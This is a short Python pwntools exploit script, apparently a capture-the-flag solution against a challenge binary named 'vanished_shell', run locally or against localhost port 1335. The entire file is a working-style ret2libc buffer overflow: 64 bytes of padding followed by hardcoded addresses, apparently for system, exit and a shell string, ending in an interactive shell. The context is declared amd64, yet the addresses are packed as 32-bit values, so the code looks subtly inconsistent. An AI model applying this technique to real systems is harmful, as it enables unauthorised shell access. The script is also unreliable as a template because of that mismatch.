#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    atk = process('./vanished_shell')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = ELF('./vanished_shell', checksec=True)
else:
    atk = remote('localhost', 1335)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = None

# Payloads
offset = b"A" * 64
payload_system = p32(0xf7dd38e0)
payload_exit = p32(0xf7dc25b0)
payload_sh = p32(0xf7f40de8)
atk.recvuntil(b"What do you want to solve?")
atk.sendline(offset + payload_system + payload_exit + payload_sh)
atk.interactive()
